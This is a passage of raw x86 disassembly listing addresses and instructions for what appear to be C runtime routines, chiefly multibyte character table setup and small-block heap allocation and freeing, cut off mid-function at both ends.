  403ddf:	jmp    0x403e73
  403de4:	push   0x40
  403de6:	xor    eax,eax
  403de8:	pop    ecx
  403de9:	mov    edi,0x4299e0
  403dee:	rep stos DWORD PTR es:[edi],eax
  403df0:	lea    ecx,[edx+edx*2]
  403df3:	shl    ecx,0x4
  403df6:	mov    DWORD PTR [ebp-0x8],ebx
  403df9:	stos   BYTE PTR es:[edi],al
  403dfa:	lea    ebx,[ecx+0x4282c8]
  403e00:	mov    al,BYTE PTR [ebx]
  403e02:	mov    esi,ebx
  403e04:	jmp    0x403e2f
  403e06:	mov    dl,BYTE PTR [esi+0x1]
  403e09:	test   dl,dl
  403e0b:	je     0x403e33
  403e0d:	movzx  eax,al
  403e10:	movzx  edi,dl
  403e13:	cmp    eax,edi
  403e15:	ja     0x403e2b
  403e17:	mov    edx,DWORD PTR [ebp-0x8]
  403e1a:	mov    dl,BYTE PTR [edx+0x4282b0]
  403e20:	or     BYTE PTR [eax+0x4299e1],dl
  403e26:	inc    eax
  403e27:	cmp    eax,edi
  403e29:	jbe    0x403e20
  403e2b:	inc    esi
  403e2c:	inc    esi
  403e2d:	mov    al,BYTE PTR [esi]
  403e2f:	test   al,al
  403e31:	jne    0x403e06
  403e33:	inc    DWORD PTR [ebp-0x8]
  403e36:	add    ebx,0x8
  403e39:	cmp    DWORD PTR [ebp-0x8],0x4
  403e3d:	jb     0x403e00
  403e3f:	mov    eax,DWORD PTR [ebp+0x8]
  403e42:	mov    ds:0x429ae4,eax
  403e47:	mov    DWORD PTR ds:0x4299c4,0x1
  403e51:	call   0x403b0d
  403e56:	lea    esi,[ecx+0x4282bc]
  403e5c:	mov    edi,0x429af0
  403e61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e63:	mov    ds:0x4299c0,eax
  403e68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e69:	jmp    0x403ec7
  403e6b:	or     BYTE PTR [eax+0x4299e1],0x4
  403e72:	inc    eax
  403e73:	cmp    eax,edx
  403e75:	jbe    0x403e6b
  403e77:	inc    ecx
  403e78:	inc    ecx
  403e79:	cmp    BYTE PTR [ecx-0x1],0x0
  403e7d:	jne    0x403dce
  403e83:	mov    eax,edi
  403e85:	or     BYTE PTR [eax+0x4299e1],0x8
  403e8c:	inc    eax
  403e8d:	cmp    eax,0xff
  403e92:	jb     0x403e85
  403e94:	mov    eax,esi
  403e96:	call   0x403b0d
  403e9b:	mov    ds:0x4299c0,eax
  403ea0:	mov    DWORD PTR ds:0x4299c4,edi
  403ea6:	jmp    0x403eae
  403ea8:	mov    DWORD PTR ds:0x4299c4,ebx
  403eae:	xor    eax,eax
  403eb0:	mov    edi,0x429af0
  403eb5:	stos   DWORD PTR es:[edi],eax
  403eb6:	stos   DWORD PTR es:[edi],eax
  403eb7:	stos   DWORD PTR es:[edi],eax
  403eb8:	jmp    0x403ec7
  403eba:	cmp    DWORD PTR ds:0x428948,ebx
  403ec0:	je     0x403ed0
  403ec2:	call   0x403b3c
  403ec7:	call   0x403b65
  403ecc:	xor    eax,eax
  403ece:	jmp    0x403ed3
  403ed0:	or     eax,0xffffffff
  403ed3:	mov    ecx,DWORD PTR [ebp-0x4]
  403ed6:	xor    ecx,DWORD PTR [ebp+0x4]
  403ed9:	pop    edi
  403eda:	pop    esi
  403edb:	pop    ebx
  403edc:	call   0x403606
  403ee1:	leave  
  403ee2:	ret    
  403ee3:	cmp    DWORD PTR ds:0x429d2c,0x0
  403eea:	jne    0x403efe
  403eec:	push   0xfffffffd
  403eee:	call   0x403cf7
  403ef3:	pop    ecx
  403ef4:	mov    DWORD PTR ds:0x429d2c,0x1
  403efe:	xor    eax,eax
  403f00:	ret    
  403f01:	push   0x140
  403f06:	push   0x0
  403f08:	push   DWORD PTR ds:0x429c00
  403f0e:	call   DWORD PTR ds:0x4260a0
  403f14:	test   eax,eax
  403f16:	mov    ds:0x4299ac,eax
  403f1b:	jne    0x403f1e
  403f1d:	ret    
  403f1e:	mov    ecx,DWORD PTR [esp+0x4]
  403f22:	and    DWORD PTR ds:0x4299a4,0x0
  403f29:	and    DWORD PTR ds:0x4299a8,0x0
  403f30:	mov    ds:0x4299b4,eax
  403f35:	xor    eax,eax
  403f37:	mov    DWORD PTR ds:0x4299b0,ecx
  403f3d:	mov    DWORD PTR ds:0x4299b8,0x10
  403f47:	inc    eax
  403f48:	ret    
  403f49:	mov    eax,ds:0x4299a8
  403f4e:	lea    ecx,[eax+eax*4]
  403f51:	mov    eax,ds:0x4299ac
  403f56:	lea    ecx,[eax+ecx*4]
  403f59:	jmp    0x403f6d
  403f5b:	mov    edx,DWORD PTR [esp+0x4]
  403f5f:	sub    edx,DWORD PTR [eax+0xc]
  403f62:	cmp    edx,0x100000
  403f68:	jb     0x403f73
  403f6a:	add    eax,0x14
  403f6d:	cmp    eax,ecx
  403f6f:	jb     0x403f5b
  403f71:	xor    eax,eax
  403f73:	ret    
  403f74:	push   ebp
  403f75:	mov    ebp,esp
  403f77:	sub    esp,0x10
  403f7a:	mov    ecx,DWORD PTR [ebp+0x8]
  403f7d:	mov    eax,DWORD PTR [ecx+0x10]
  403f80:	push   esi
  403f81:	mov    esi,DWORD PTR [ebp+0xc]
  403f84:	push   edi
  403f85:	mov    edi,esi
  403f87:	sub    edi,DWORD PTR [ecx+0xc]
  403f8a:	add    esi,0xfffffffc
  403f8d:	shr    edi,0xf
  403f90:	mov    ecx,edi
  403f92:	imul   ecx,ecx,0x204
  403f98:	lea    ecx,[ecx+eax*1+0x144]
  403f9f:	mov    DWORD PTR [ebp-0x10],ecx
  403fa2:	mov    ecx,DWORD PTR [esi]
  403fa4:	dec    ecx
  403fa5:	test   cl,0x1
  403fa8:	mov    DWORD PTR [ebp-0x4],ecx
  403fab:	jne    0x404288
  403fb1:	push   ebx
  403fb2:	lea    ebx,[ecx+esi*1]
  403fb5:	mov    edx,DWORD PTR [ebx]
  403fb7:	mov    DWORD PTR [ebp-0xc],edx
  403fba:	mov    edx,DWORD PTR [esi-0x4]
  403fbd:	mov    DWORD PTR [ebp-0x8],edx
  403fc0:	mov    edx,DWORD PTR [ebp-0xc]
  403fc3:	test   dl,0x1
  403fc6:	mov    DWORD PTR [ebp+0xc],ebx
  403fc9:	jne    0x40403f
  403fcb:	sar    edx,0x4
  403fce:	dec    edx
  403fcf:	cmp    edx,0x3f
  403fd2:	jbe    0x403fd7
  403fd4:	push   0x3f
  403fd6:	pop    edx
  403fd7:	mov    ecx,DWORD PTR [ebx+0x4]
  403fda:	cmp    ecx,DWORD PTR [ebx+0x8]
  403fdd:	jne    0x404021
  403fdf:	cmp    edx,0x20
  403fe2:	mov    ebx,0x80000000
  403fe7:	jae    0x404002
  403fe9:	mov    ecx,edx
  403feb:	shr    ebx,cl
  403fed:	lea    ecx,[edx+eax*1+0x4]
  403ff1:	not    ebx
  403ff3:	and    DWORD PTR [eax+edi*4+0x44],ebx
  403ff7:	dec    BYTE PTR [ecx]
  403ff9:	jne    0x40401e
  403ffb:	mov    ecx,DWORD PTR [ebp+0x8]
  403ffe:	and    DWORD PTR [ecx],ebx
  404000:	jmp    0x40401e
  404002:	lea    ecx,[edx-0x20]
  404005:	shr    ebx,cl
  404007:	lea    ecx,[edx+eax*1+0x4]
  40400b:	not    ebx
  40400d:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  404014:	dec    BYTE PTR [ecx]
  404016:	jne    0x40401e
  404018:	mov    ecx,DWORD PTR [ebp+0x8]
  40401b:	and    DWORD PTR [ecx+0x4],ebx
  40401e:	mov    ebx,DWORD PTR [ebp+0xc]
  404021:	mov    edx,DWORD PTR [ebx+0x8]
  404024:	mov    ebx,DWORD PTR [ebx+0x4]
  404027:	mov    ecx,DWORD PTR [ebp-0x4]
  40402a:	add    ecx,DWORD PTR [ebp-0xc]
  40402d:	mov    DWORD PTR [edx+0x4],ebx
  404030:	mov    edx,DWORD PTR [ebp+0xc]
  404033:	mov    ebx,DWORD PTR [edx+0x4]
  404036:	mov    edx,DWORD PTR [edx+0x8]
  404039:	mov    DWORD PTR [ebx+0x8],edx
  40403c:	mov    DWORD PTR [ebp-0x4],ecx
  40403f:	mov    edx,ecx
  404041:	sar    edx,0x4
  404044:	dec    edx
  404045:	cmp    edx,0x3f
  404048:	jbe    0x40404d
  40404a:	push   0x3f
  40404c:	pop    edx
  40404d:	mov    ebx,DWORD PTR [ebp-0x8]
  404050:	and    ebx,0x1
  404053:	mov    DWORD PTR [ebp-0xc],ebx
  404056:	jne    0x4040eb
  40405c:	sub    esi,DWORD PTR [ebp-0x8]
  40405f:	mov    ebx,DWORD PTR [ebp-0x8]
  404062:	sar    ebx,0x4
  404065:	push   0x3f
  404067:	mov    DWORD PTR [ebp+0xc],esi
  40406a:	dec    ebx
  40406b:	pop    esi
  40406c:	cmp    ebx,esi
  40406e:	jbe    0x404072
  404070:	mov    ebx,esi
  404072:	add    ecx,DWORD PTR [ebp-0x8]
  404075:	mov    edx,ecx
  404077:	sar    edx,0x4
  40407a:	dec    edx
  40407b:	cmp    edx,esi
  40407d:	mov    DWORD PTR [ebp-0x4],ecx
  404080:	jbe    0x404084
  404082:	mov    edx,esi
  404084:	cmp    ebx,edx
  404086:	je     0x4040e6
  404088:	mov    ecx,DWORD PTR [ebp+0xc]
  40408b:	mov    esi,DWORD PTR [ecx+0x4]
  40408e:	cmp    esi,DWORD PTR [ecx+0x8]
  404091:	jne    0x4040ce
  404093:	cmp    ebx,0x20
  404096:	mov    esi,0x80000000
  40409b:	jae    0x4040b4
  40409d:	mov    ecx,ebx
  40409f:	shr    esi,cl
  4040a1:	not    esi
  4040a3:	and    DWORD PTR [eax+edi*4+0x44],esi
  4040a7:	dec    BYTE PTR [ebx+eax*1+0x4]
  4040ab:	jne    0x4040ce
  4040ad:	mov    ecx,DWORD PTR [ebp+0x8]
  4040b0:	and    DWORD PTR [ecx],esi
  4040b2:	jmp    0x4040ce
  4040b4:	lea    ecx,[ebx-0x20]
  4040b7:	shr    esi,cl
  4040b9:	not    esi
  4040bb:	and    DWORD PTR [eax+edi*4+0xc4],esi
  4040c2:	dec    BYTE PTR [ebx+eax*1+0x4]
  4040c6:	jne    0x4040ce
  4040c8:	mov    ecx,DWORD PTR [ebp+0x8]
  4040cb:	and    DWORD PTR [ecx+0x4],esi
  4040ce:	mov    ecx,DWORD PTR [ebp+0xc]
  4040d1:	mov    esi,DWORD PTR [ecx+0x8]
  4040d4:	mov    ecx,DWORD PTR [ecx+0x4]
  4040d7:	mov    DWORD PTR [esi+0x4],ecx
  4040da:	mov    ecx,DWORD PTR [ebp+0xc]
  4040dd:	mov    esi,DWORD PTR [ecx+0x4]
  4040e0:	mov    ecx,DWORD PTR [ecx+0x8]
  4040e3:	mov    DWORD PTR [esi+0x8],ecx
  4040e6:	mov    esi,DWORD PTR [ebp+0xc]
  4040e9:	jmp    0x4040ee
  4040eb:	mov    ebx,DWORD PTR [ebp+0x8]
  4040ee:	cmp    DWORD PTR [ebp-0xc],0x0
  4040f2:	jne    0x4040fc
  4040f4:	cmp    ebx,edx
  4040f6:	je     0x40417c
  4040fc:	mov    ecx,DWORD PTR [ebp-0x10]
  4040ff:	lea    ecx,[ecx+edx*8]
  404102:	mov    ebx,DWORD PTR [ecx+0x4]
  404105:	mov    DWORD PTR [esi+0x8],ecx
  404108:	mov    DWORD PTR [esi+0x4],ebx
  40410b:	mov    DWORD PTR [ecx+0x4],esi
  40410e:	mov    ecx,DWORD PTR [esi+0x4]
  404111:	mov    DWORD PTR [ecx+0x8],esi
  404114:	mov    ecx,DWORD PTR [esi+0x4]
  404117:	cmp    ecx,DWORD PTR [esi+0x8]
  40411a:	jne    0x40417c
  40411c:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  404120:	mov    BYTE PTR [ebp+0xf],cl
  404123:	inc    cl
  404125:	cmp    edx,0x20
  404128:	mov    BYTE PTR [edx+eax*1+0x4],cl
  40412c:	jae    0x404153
  40412e:	cmp    BYTE PTR [ebp+0xf],0x0
  404132:	jne    0x404142
  404134:	mov    ecx,edx
  404136:	mov    ebx,0x80000000
  40413b:	shr    ebx,cl
  40413d:	mov    ecx,DWORD PTR [ebp+0x8]
  404140:	or     DWORD PTR [ecx],ebx
  404142:	mov    ebx,0x80000000
  404147:	mov    ecx,edx
  404149:	shr    ebx,cl
  40414b:	lea    eax,[eax+edi*4+0x44]
  40414f:	or     DWORD PTR [eax],ebx
  404151:	jmp    0x40417c
  404153:	cmp    BYTE PTR [ebp+0xf],0x0
  404157:	jne    0x404169
  404159:	lea    ecx,[edx-0x20]
  40415c:	mov    ebx,0x80000000
  404161:	shr    ebx,cl
  404163:	mov    ecx,DWORD PTR [ebp+0x8]
  404166:	or     DWORD PTR [ecx+0x4],ebx
  404169:	lea    ecx,[edx-0x20]
  40416c:	mov    edx,0x80000000
  404171:	shr    edx,cl
  404173:	lea    eax,[eax+edi*4+0xc4]
  40417a:	or     DWORD PTR [eax],edx
  40417c:	mov    eax,DWORD PTR [ebp-0x4]
  40417f:	mov    DWORD PTR [esi],eax
  404181:	mov    DWORD PTR [eax+esi*1-0x4],eax
  404185:	mov    eax,DWORD PTR [ebp-0x10]
  404188:	dec    DWORD PTR [eax]
  40418a:	jne    0x404287
  404190:	mov    eax,ds:0x4299a4
  404195:	test   eax,eax
  404197:	je     0x404279
  40419d:	mov    ecx,DWORD PTR ds:0x4299bc
  4041a3:	mov    esi,DWORD PTR ds:0x426004
  4041a9:	push   0x4000
  4041ae:	shl    ecx,0xf
  4041b1:	add    ecx,DWORD PTR [eax+0xc]
  4041b4:	mov    ebx,0x8000
  4041b9:	push   ebx
  4041ba:	push   ecx
  4041bb:	call   esi
  4041bd:	mov    ecx,DWORD PTR ds:0x4299bc
  4041c3:	mov    eax,ds:0x4299a4
  4041c8:	mov    edx,0x80000000
  4041cd:	shr    edx,cl
  4041cf:	or     DWORD PTR [eax+0x8],edx
  4041d2:	mov    eax,ds:0x4299a4
  4041d7:	mov    eax,DWORD PTR [eax+0x10]
  4041da:	mov    ecx,DWORD PTR ds:0x4299bc
  4041e0:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  4041e8:	mov    eax,ds:0x4299a4
  4041ed:	mov    eax,DWORD PTR [eax+0x10]
  4041f0:	dec    BYTE PTR [eax+0x43]
  4041f3:	mov    eax,ds:0x4299a4
  4041f8:	mov    ecx,DWORD PTR [eax+0x10]
  4041fb:	cmp    BYTE PTR [ecx+0x43],0x0
  4041ff:	jne    0x40420a
  404201:	and    DWORD PTR [eax+0x4],0xfffffffe
  404205:	mov    eax,ds:0x4299a4
  40420a:	cmp    DWORD PTR [eax+0x8],0xffffffff
  40420e:	jne    0x404279
  404210:	push   ebx
  404211:	push   0x0
  404213:	push   DWORD PTR [eax+0xc]
  404216:	call   esi
  404218:	mov    eax,ds:0x4299a4
  40421d:	push   DWORD PTR [eax+0x10]
  404220:	push   0x0
  404222:	push   DWORD PTR ds:0x429c00
  404228:	call   DWORD PTR ds:0x426098
  40422e:	mov    eax,ds:0x4299a8
  404233:	mov    edx,DWORD PTR ds:0x4299ac
  404239:	lea    eax,[eax+eax*4]
  40423c:	shl    eax,0x2
  40423f:	mov    ecx,eax
  404241:	mov    eax,ds:0x4299a4
  404246:	sub    ecx,eax
  404248:	lea    ecx,[ecx+edx*1-0x14]
  40424c:	push   ecx
  40424d:	lea    ecx,[eax+0x14]
  404250:	push   ecx
  404251:	push   eax
  404252:	call   0x405600
  404257:	mov    eax,DWORD PTR [ebp+0x8]
  40425a:	add    esp,0xc
  40425d:	dec    DWORD PTR ds:0x4299a8
  404263:	cmp    eax,DWORD PTR ds:0x4299a4
  404269:	jbe    0x40426f
  40426b:	sub    DWORD PTR [ebp+0x8],0x14
  40426f:	mov    eax,ds:0x4299ac
  404274:	mov    ds:0x4299b4,eax
  404279:	mov    eax,DWORD PTR [ebp+0x8]
  40427c:	mov    ds:0x4299a4,eax
  404281:	mov    DWORD PTR ds:0x4299bc,edi
  404287:	pop    ebx
  404288:	pop    edi
  404289:	pop    esi
  40428a:	leave  
  40428b:	ret    
  40428c:	mov    eax,ds:0x4299a8
  404291:	mov    ecx,DWORD PTR ds:0x4299b8
  404297:	push   edi
  404298:	xor    edi,edi
  40429a:	cmp    eax,ecx
  40429c:	jne    0x4042d2
  40429e:	lea    eax,[ecx+ecx*4+0x50]
  4042a2:	shl    eax,0x2
  4042a5:	push   eax
  4042a6:	push   DWORD PTR ds:0x4299ac
  4042ac:	push   edi
  4042ad:	push   DWORD PTR ds:0x429c00
  4042b3:	call   DWORD PTR ds:0x4260c0
  4042b9:	cmp    eax,edi
  4042bb:	jne    0x4042c1
  4042bd:	xor    eax,eax
  4042bf:	pop    edi
  4042c0:	ret    
  4042c1:	add    DWORD PTR ds:0x4299b8,0x10
  4042c8:	mov    ds:0x4299ac,eax
  4042cd:	mov    eax,ds:0x4299a8
  4042d2:	mov    ecx,DWORD PTR ds:0x4299ac
  4042d8:	push   esi
  4042d9:	push   0x41c4
  4042de:	push   0x8
  4042e0:	push   DWORD PTR ds:0x429c00
  4042e6:	lea    eax,[eax+eax*4]
  4042e9:	lea    esi,[ecx+eax*4]
  4042ec:	call   DWORD PTR ds:0x4260a0
  4042f2:	cmp    eax,edi
  4042f4:	mov    DWORD PTR [esi+0x10],eax
  4042f7:	jne    0x4042fd
  4042f9:	xor    eax,eax
  4042fb:	jmp    0x404340
  4042fd:	push   0x4
  4042ff:	push   0x2000
  404304:	push   0x100000
  404309:	push   edi
  40430a:	call   DWORD PTR ds:0x426020
  404310:	cmp    eax,edi
  404312:	mov    DWORD PTR [esi+0xc],eax
  404315:	jne    0x404329
  404317:	push   DWORD PTR [esi+0x10]
  40431a:	push   edi
  40431b:	push   DWORD PTR ds:0x429c00
  404321:	call   DWORD PTR ds:0x426098
  404327:	jmp    0x4042f9
  404329:	or     DWORD PTR [esi+0x8],0xffffffff
  40432d:	mov    DWORD PTR [esi],edi
  40432f:	mov    DWORD PTR [esi+0x4],edi
  404332:	inc    DWORD PTR ds:0x4299a8
  404338:	mov    eax,DWORD PTR [esi+0x10]
  40433b:	or     DWORD PTR [eax],0xffffffff
  40433e:	mov    eax,esi
  404340:	pop    esi
  404341:	pop    edi
  404342:	ret    
  404343:	push   ebp
  404344:	mov    ebp,esp
  404346:	push   ecx
  404347:	push   ecx
  404348:	mov    ecx,DWORD PTR [ebp+0x8]
  40434b:	mov    eax,DWORD PTR [ecx+0x8]
  40434e:	push   ebx
  40434f:	push   esi
  404350:	mov    esi,DWORD PTR [ecx+0x10]
  404353:	push   edi
  404354:	xor    ebx,ebx
  404356:	jmp    0x40435b
  404358:	shl    eax,1
  40435a:	inc    ebx
  40435b:	test   eax,eax
  40435d:	jge    0x404358
  40435f:	mov    eax,ebx
  404361:	imul   eax,eax,0x204
  404367:	lea    eax,[eax+esi*1+0x144]
  40436e:	push   0x3f
  404370:	mov    DWORD PTR [ebp-0x8],eax
  404373:	pop    edx
  404374:	mov    DWORD PTR [eax+0x8],eax
  404377:	mov    DWORD PTR [eax+0x4],eax
  40437a:	add    eax,0x8
  40437d:	dec    edx
  40437e:	jne    0x404374
  404380:	push   0x4
  404382:	mov    edi,ebx
  404384:	push   0x1000
  404389:	shl    edi,0xf
  40438c:	add    edi,DWORD PTR [ecx+0xc]
  40438f:	push   0x8000
  404394:	push   edi
  404395:	call   DWORD PTR ds:0x426020
  40439b:	test   eax,eax
  40439d:	jne    0x4043a7
  40439f:	or     eax,0xffffffff
  4043a2:	jmp    0x404444
  4043a7:	lea    edx,[edi+0x7000]
  4043ad:	cmp    edi,edx
  4043af:	mov    DWORD PTR [ebp-0x4],edx
  4043b2:	ja     0x4043f7
  4043b4:	mov    ecx,edx
  4043b6:	sub    ecx,edi
  4043b8:	shr    ecx,0xc
  4043bb:	lea    eax,[edi+0x10]
  4043be:	inc    ecx
  4043bf:	or     DWORD PTR [eax-0x8],0xffffffff
  4043c3:	or     DWORD PTR [eax+0xfec],0xffffffff
  4043ca:	lea    edx,[eax+0xffc]
  4043d0:	mov    DWORD PTR [eax],edx
  4043d2:	lea    edx,[eax-0x1004]
  4043d8:	mov    DWORD PTR [eax-0x4],0xff0
  4043df:	mov    DWORD PTR [eax+0x4],edx
  4043e2:	mov    DWORD PTR [eax+0xfe8],0xff0
  4043ec:	add    eax,0x1000
  4043f1:	dec    ecx
  4043f2:	jne    0x4043bf
  4043f4:	mov    edx,DWORD PTR [ebp-0x4]
  4043f7:	mov    eax,DWORD PTR [ebp-0x8]
  4043fa:	add    eax,0x1f8
  4043ff:	lea    ecx,[edi+0xc]
  404402:	mov    DWORD PTR [eax+0x4],ecx
  404405:	mov    DWORD PTR [ecx+0x8],eax
  404408:	lea    ecx,[edx+0xc]
  40440b:	mov    DWORD PTR [eax+0x8],ecx
  40440e:	mov    DWORD PTR [ecx+0x4],eax
  404411:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  404416:	xor    edi,edi
  404418:	inc    edi
  404419:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  404420:	mov    al,BYTE PTR [esi+0x43]
  404423:	mov    cl,al
  404425:	inc    cl
  404427:	test   al,al
  404429:	mov    eax,DWORD PTR [ebp+0x8]
  40442c:	mov    BYTE PTR [esi+0x43],cl
  40442f:	jne    0x404434
  404431:	or     DWORD PTR [eax+0x4],edi
  404434:	mov    edx,0x80000000
  404439:	mov    ecx,ebx
  40443b:	shr    edx,cl
  40443d:	not    edx
  40443f:	and    DWORD PTR [eax+0x8],edx
  404442:	mov    eax,ebx
  404444:	pop    edi
  404445:	pop    esi
  404446:	pop    ebx
  404447:	leave  
  404448:	ret    
  404449:	push   ebp
  40444a:	mov    ebp,esp
  40444c:	sub    esp,0xc
  40444f:	mov    ecx,DWORD PTR [ebp+0x8]
  404452:	mov    eax,DWORD PTR [ecx+0x10]
  404455:	push   ebx
  404456:	push   esi
  404457:	mov    esi,DWORD PTR [ebp+0x10]
  40445a:	push   edi
  40445b:	mov    edi,DWORD PTR [ebp+0xc]
  40445e:	mov    edx,edi
  404460:	sub    edx,DWORD PTR [ecx+0xc]
  404463:	add    esi,0x17
  404466:	shr    edx,0xf
  404469:	mov    ecx,edx
  40446b:	imul   ecx,ecx,0x204
  404471:	lea    ecx,[ecx+eax*1+0x144]
  404478:	mov    DWORD PTR [ebp-0xc],ecx
  40447b:	mov    ecx,DWORD PTR [edi-0x4]
  40447e:	and    esi,0xfffffff0
  404481:	dec    ecx
  404482:	cmp    esi,ecx
  404484:	lea    edi,[ecx+edi*1-0x4]
  404488:	mov    ebx,DWORD PTR [edi]
  40448a:	mov    DWORD PTR [ebp+0x10],ecx
  40448d:	mov    DWORD PTR [ebp-0x4],ebx
  404490:	jle    0x4045eb
  404496:	test   bl,0x1
  404499:	jne    0x4045e4
  40449f:	add    ebx,ecx
  4044a1:	cmp    esi,ebx
  4044a3:	jg     0x4045e4
  4044a9:	mov    ecx,DWORD PTR [ebp-0x4]
  4044ac:	sar    ecx,0x4
  4044af:	dec    ecx
  4044b0:	cmp    ecx,0x3f
  4044b3:	mov    DWORD PTR [ebp-0x8],ecx
  4044b6:	jbe    0x4044be
  4044b8:	push   0x3f
  4044ba:	pop    ecx
  4044bb:	mov    DWORD PTR [ebp-0x8],ecx
  4044be:	mov    ebx,DWORD PTR [edi+0x4]
  4044c1:	cmp    ebx,DWORD PTR [edi+0x8]
  4044c4:	jne    0x404509
  4044c6:	cmp    ecx,0x20
  4044c9:	mov    ebx,0x80000000
  4044ce:	jae    0x4044ea
  4044d0:	shr    ebx,cl
  4044d2:	mov    ecx,DWORD PTR [ebp-0x8]
  4044d5:	lea    ecx,[ecx+eax*1+0x4]
  4044d9:	not    ebx
  4044db:	and    DWORD PTR [eax+edx*4+0x44],ebx
  4044df:	dec    BYTE PTR [ecx]
  4044e1:	jne    0x404509
  4044e3:	mov    ecx,DWORD PTR [ebp+0x8]
  4044e6:	and    DWORD PTR [ecx],ebx
  4044e8:	jmp    0x404509
  4044ea:	add    ecx,0xffffffe0
  4044ed:	shr    ebx,cl
  4044ef:	mov    ecx,DWORD PTR [ebp-0x8]
  4044f2:	lea    ecx,[ecx+eax*1+0x4]
  4044f6:	not    ebx
  4044f8:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  4044ff:	dec    BYTE PTR [ecx]
  404501:	jne    0x404509
  404503:	mov    ecx,DWORD PTR [ebp+0x8]
  404506:	and    DWORD PTR [ecx+0x4],ebx
  404509:	mov    ecx,DWORD PTR [edi+0x8]
  40450c:	mov    ebx,DWORD PTR [edi+0x4]
  40450f:	mov    DWORD PTR [ecx+0x4],ebx
  404512:	mov    ecx,DWORD PTR [edi+0x4]
  404515:	mov    edi,DWORD PTR [edi+0x8]
  404518:	mov    DWORD PTR [ecx+0x8],edi
  40451b:	mov    ecx,DWORD PTR [ebp+0x10]
  40451e:	sub    ecx,esi
  404520:	add    DWORD PTR [ebp-0x4],ecx
  404523:	cmp    DWORD PTR [ebp-0x4],0x0
  404527:	jle    0x4045d2
  40452d:	mov    edi,DWORD PTR [ebp-0x4]
  404530:	mov    ecx,DWORD PTR [ebp+0xc]
  404533:	sar    edi,0x4
  404536:	dec    edi
  404537:	cmp    edi,0x3f
  40453a:	lea    ecx,[ecx+esi*1-0x4]
  40453e:	jbe    0x404543
  404540:	push   0x3f
  404542:	pop    edi
  404543:	mov    ebx,DWORD PTR [ebp-0xc]
  404546:	lea    ebx,[ebx+edi*8]
  404549:	mov    DWORD PTR [ebp+0x10],ebx
  40454c:	mov    ebx,DWORD PTR [ebx+0x4]
  40454f:	mov    DWORD PTR [ecx+0x4],ebx
  404552:	mov    ebx,DWORD PTR [ebp+0x10]
  404555:	mov    DWORD PTR [ecx+0x8],ebx
  404558:	mov    DWORD PTR [ebx+0x4],ecx
  40455b:	mov    ebx,DWORD PTR [ecx+0x4]
  40455e:	mov    DWORD PTR [ebx+0x8],ecx
  404561:	mov    ebx,DWORD PTR [ecx+0x4]
  404564:	cmp    ebx,DWORD PTR [ecx+0x8]
  404567:	jne    0x4045c0
  404569:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  40456d:	mov    BYTE PTR [ebp+0x13],cl
  404570:	inc    cl
  404572:	cmp    edi,0x20
  404575:	mov    BYTE PTR [edi+eax*1+0x4],cl
  404579:	jae    0x404597
  40457b:	cmp    BYTE PTR [ebp+0x13],0x0
  40457f:	jne    0x40458f
  404581:	mov    ecx,edi
  404583:	mov    ebx,0x80000000
  404588:	shr    ebx,cl
  40458a:	mov    ecx,DWORD PTR [ebp+0x8]
  40458d:	or     DWORD PTR [ecx],ebx
  40458f:	lea    eax,[eax+edx*4+0x44]
  404593:	mov    ecx,edi
  404595:	jmp    0x4045b7
  404597:	cmp    BYTE PTR [ebp+0x13],0x0
  40459b:	jne    0x4045ad
  40459d:	lea    ecx,[edi-0x20]
  4045a0:	mov    ebx,0x80000000
  4045a5:	shr    ebx,cl
  4045a7:	mov    ecx,DWORD PTR [ebp+0x8]
  4045aa:	or     DWORD PTR [ecx+0x4],ebx
  4045ad:	lea    eax,[eax+edx*4+0xc4]
  4045b4:	lea    ecx,[edi-0x20]
  4045b7:	mov    edx,0x80000000
  4045bc:	shr    edx,cl
  4045be:	or     DWORD PTR [eax],edx
  4045c0:	mov    edx,DWORD PTR [ebp+0xc]
  4045c3:	mov    ecx,DWORD PTR [ebp-0x4]
  4045c6:	lea    eax,[edx+esi*1-0x4]
  4045ca:	mov    DWORD PTR [eax],ecx
  4045cc:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  4045d0:	jmp    0x4045d5
  4045d2:	mov    edx,DWORD PTR [ebp+0xc]
  4045d5:	lea    eax,[esi+0x1]
  4045d8:	mov    DWORD PTR [edx-0x4],eax
  4045db:	mov    DWORD PTR [edx+esi*1-0x8],eax
  4045df:	jmp    0x404720
  4045e4:	xor    eax,eax
  4045e6:	jmp    0x404723
  4045eb:	jge    0x404720
  4045f1:	mov    ebx,DWORD PTR [ebp+0xc]
  4045f4:	sub    DWORD PTR [ebp+0x10],esi
  4045f7:	lea    ecx,[esi+0x1]
  4045fa:	mov    DWORD PTR [ebx-0x4],ecx
  4045fd:	lea    ebx,[ebx+esi*1-0x4]
  404601:	mov    esi,DWORD PTR [ebp+0x10]
  404604:	sar    esi,0x4
  404607:	dec    esi
  404608:	cmp    esi,0x3f
  40460b:	mov    DWORD PTR [ebp+0xc],ebx
  40460e:	mov    DWORD PTR [ebx-0x4],ecx
  404611:	jbe    0x404616
  404613:	push   0x3f
  404615:	pop    esi
  404616:	test   BYTE PTR [ebp-0x4],0x1
  40461a:	jne    0x4046a0
  404620:	mov    esi,DWORD PTR [ebp-0x4]
  404623:	sar    esi,0x4
  404626:	dec    esi
  404627:	cmp    esi,0x3f
  40462a:	jbe    0x40462f
  40462c:	push   0x3f
  40462e:	pop    esi
  40462f:	mov    ecx,DWORD PTR [edi+0x4]
  404632:	cmp    ecx,DWORD PTR [edi+0x8]
  404635:	jne    0x404679
  404637:	cmp    esi,0x20
  40463a:	mov    ebx,0x80000000
  40463f:	jae    0x40465a
  404641:	mov    ecx,esi
  404643:	shr    ebx,cl
  404645:	lea    esi,[esi+eax*1+0x4]
  404649:	not    ebx
  40464b:	and    DWORD PTR [eax+edx*4+0x44],ebx
  40464f:	dec    BYTE PTR [esi]
  404651:	jne    0x404676
  404653:	mov    ecx,DWORD PTR [ebp+0x8]
  404656:	and    DWORD PTR [ecx],ebx
  404658:	jmp    0x404676
  40465a:	lea    ecx,[esi-0x20]
  40465d:	shr    ebx,cl
  40465f:	lea    ecx,[esi+eax*1+0x4]
  404663:	not    ebx
